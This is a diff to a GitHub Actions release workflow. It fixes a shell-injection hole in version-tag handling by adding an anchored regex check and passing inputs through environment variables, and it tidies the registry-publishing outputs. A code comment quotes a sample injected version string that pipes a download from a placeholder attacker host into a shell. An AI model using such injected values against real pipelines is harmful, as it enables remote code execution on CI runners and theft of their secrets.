@@ -98,10 +98,25 @@ jobs:
           # every shape the bash regex did (single- or multi-digit
           # version components, optional dash-suffix like `-rc.1`),
           # without the bash dependency.
-          case "${TAG}" in
-            v[0-9]*.[0-9]*.[0-9]*|"v[0-9]*.[0-9]*.[0-9]*-"*) ;;
-            *) echo "ERROR: '${TAG}' is not vX.Y.Z (optionally -suffix)"; exit 1 ;;
-          esac
+          # v2.11.4 (#211): the prior `case` pattern was a loose
+          # shell glob (`v[0-9]*.[0-9]*.[0-9]*`) — it accepted
+          # shell metachars after the version root, so a
+          # workflow_dispatch caller could feed
+          # `version='v1.2.3$(curl evil.com|sh)'` past the
+          # validator. The shell sinks downstream (build meta
+          # step, publish meta step) interpolated the input
+          # directly into `run:` blocks, where GitHub Actions
+          # expands `${{ inputs.version }}` before shell
+          # execution. Tighten with an anchored regex via
+          # `grep -Eq`: accepts the documented version shape
+          # (single- or multi-digit components, optional
+          # dash-suffix like `-rc.1`) and rejects everything
+          # else, including `$`, `(`, `)`, backtick, `;`, `&`,
+          # `|`, and any other shell metacharacter.
+          if ! printf '%s' "${TAG}" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "ERROR: '${TAG}' is not vX.Y.Z (optionally -suffix)"
+            exit 1
+          fi
           echo "TAG=${TAG}" >> "$GITHUB_OUTPUT"
 
   # Job 2: tag-reachability guard. Enforces AGENTS.md "tag the
@@ -323,15 +338,16 @@ jobs:
       - name: Resolve tag, version and enabled registries
         id: meta
         env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
           DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
           DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
           AWS_ROLE_TO_ASSUME: ${{ secrets.AWS_ROLE_TO_ASSUME }}
         run: |
           set -euo pipefail
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            tag="${{ inputs.version }}"
+          if [ "${GITHUB_EVENT_NAME}" = "workflow_dispatch" ]; then
+            tag="${INPUT_VERSION}"
           else
-            tag="${{ github.ref_name }}"
+            tag="${GITHUB_REF_NAME}"
           fi
           version="${tag#v}"
           image="ghcr.io/${{ github.repository_owner }}/ftp-deployment-action"
@@ -357,10 +373,22 @@ jobs:
             } >> "$GITHUB_OUTPUT"
             echo "Docker Hub publishing ENABLED (${dockerhub_image})"
           else
+            # v2.11.4 (#217): always emit the `dockerhub_*` outputs
+            # (even on the disabled branch) so downstream cosign /
+            # SBOM guards can rely on the invariant
+            # "enabled=true ⇒ image is set; otherwise both are empty".
+            # Pre-fix, a downstream step reading an unset
+            # `steps.meta.outputs.dockerhub_image` on the disabled
+            # branch could silently produce an empty string and a
+            # confusing cosign error.
+            {
+              echo "dockerhub_image="
+              echo "dockerhub_enabled=false"
+            } >> "$GITHUB_OUTPUT"
             echo "::notice::Docker Hub secrets (DOCKERHUB_USERNAME, DOCKERHUB_TOKEN) not set; skipping docker.io publish"
           fi
 
-          # ECR Public publishing is temporarily disabled. The
+          # ECR Public publishing is intentionally disabled. The
           # AWS_ROLE_TO_ASSUME secret exists in the repo but the
           # IAM role's OIDC trust policy is not configured to
           # allow this repo, which makes `Configure AWS
@@ -368,11 +396,16 @@ jobs:
           # `Not authorized to perform sts:AssumeRoleWithWebIdentity`.
           # The maintainer does not currently have access to the
           # AWS account, so we cannot fix the trust policy from
-          # the repo side. To re-enable: replace `false` with
-          # `[ -n "${AWS_ROLE_TO_ASSUME}" ]` and uncomment the
-          # two ECR Public steps in the `Build · release image`
-          # job below.
-          if false; then
+          # the repo side. We keep the conditional block (instead
+          # of deleting it) so the re-enable diff is trivial, but
+          # emit empty `ecr_*` outputs so downstream guards
+          # always see a defined value (v2.11.4, #217). The
+          # `ECR_DISABLED_FORCE` opt-in switch is intentionally
+          # unset in CI today; setting it (e.g. for a one-off
+          # test run) combined with `AWS_ROLE_TO_ASSUME` is
+          # enough to enable the publish path without rewriting
+          # this step.
+          if [ -n "${ECR_DISABLED_FORCE:-}" ] && [ -n "${AWS_ROLE_TO_ASSUME}" ]; then
             ecr_image="public.ecr.aws/m2z1h0m9/ftp-deployment-action"
             tags="${tags}"$'\n'"${ecr_image}:${version}"$'\n'"${ecr_image}:${tag}"$'\n'"${ecr_image}:latest"
             {
@@ -381,6 +414,10 @@ jobs:
             } >> "$GITHUB_OUTPUT"
             echo "ECR Public publishing ENABLED (${ecr_image})"
           else
+            {
+              echo "ecr_image="
+              echo "ecr_enabled=false"
+            } >> "$GITHUB_OUTPUT"
             echo "::notice::ECR Public publishing disabled in release.yml (AWS IAM trust policy needs update); skipping public.ecr.aws publish"
           fi
 
@@ -653,9 +690,11 @@ jobs:
 
       - name: Extract metadata
         id: meta
+        env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.version || github.ref_name }}"
+          TAG="${INPUT_VERSION:-${GITHUB_REF_NAME}}"
           {
             echo "tag=${TAG}"
             echo "version=${TAG#v}"
@@ -677,7 +716,7 @@ jobs:
           name: ${{ steps.meta.outputs.tag }}
           make_latest: 'true'
           generate_release_notes: ${{ steps.meta.outputs.body-empty == 'true' }}
-          body_path: ${{ steps.meta.outputs.body-empty == 'true' && '' || 'release/CHANGELOG.body.md' }}
+          body_path: ${{ steps.meta.outputs.body-empty != 'true' && 'release/CHANGELOG.body.md' || '' }}
           files: |
             release/sbom.cyclonedx.json
           fail_on_unmatched_files: true
